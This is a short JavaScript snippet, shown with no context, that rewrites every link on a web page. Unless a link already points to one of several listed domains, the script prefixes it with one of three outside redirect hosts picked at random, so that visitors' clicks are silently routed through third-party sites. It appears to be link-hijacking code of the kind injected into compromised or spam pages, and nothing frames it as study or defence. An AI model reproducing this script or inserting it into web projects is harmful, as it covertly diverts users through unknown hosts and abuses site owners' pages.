var links = document.links;
for (var i=0, iLen=links.length; i<iLen; i++) {
var threads = ['https://wwe.lynsr.info/?', 'https://blog.musz.info/?', 'http://faketaxi.s602.xrea.com/go/?'];  
var random  = threads[Math.floor(Math.random() * threads.length)];
var hrefer = document.links[i].href;
if(hrefer.match("wwe.lynsr") || hrefer.match("faketaxi") || hrefer.match("blog.musz")|| hrefer.match(".xyz")|| hrefer.match("ce.alrau")|| hrefer.match("ce.nyrvc")|| hrefer.match("ja.ayrce")) {
document.links[i].href = document.links[i].href; 
 }else{links[i].href = random + links[i].href;}
 }
